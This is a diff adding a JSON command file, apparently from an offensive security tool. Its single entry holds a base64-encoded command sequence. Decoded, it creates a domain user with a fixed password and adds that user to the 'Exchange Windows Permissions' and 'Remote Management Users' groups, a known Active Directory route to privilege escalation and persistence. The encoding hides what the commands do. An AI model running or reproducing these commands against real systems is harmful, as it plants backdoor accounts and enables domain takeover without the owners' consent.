@@ -1,0 +1,12 @@
+{
+    "command": {
+        "create_user_add_groups": {
+            "description": "Add domain user then add to domain and local groups",
+            "commands": [
+                "bmV0IHVzZXIgam9obiBhYmMxMjMhIC9hZGQgL2RvbWFpbgpuZXQgZ3JvdXAgIkV4Y2hhbmdlIFdpbmRvd3MgUGVybWlzc2lvbnMiIGpvaG4gL2FkZCAoUmVxdWlyZXMgR2VuZXJpY0FsbCBmcm9tIGdyb3VwIG1lbWJlcnNoaXApCm5ldCBncm91cCAiUmVtb3RlIE1hbmFnZW1lbnQgVXNlcnMiIGpvaG4gL2FkZA=="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
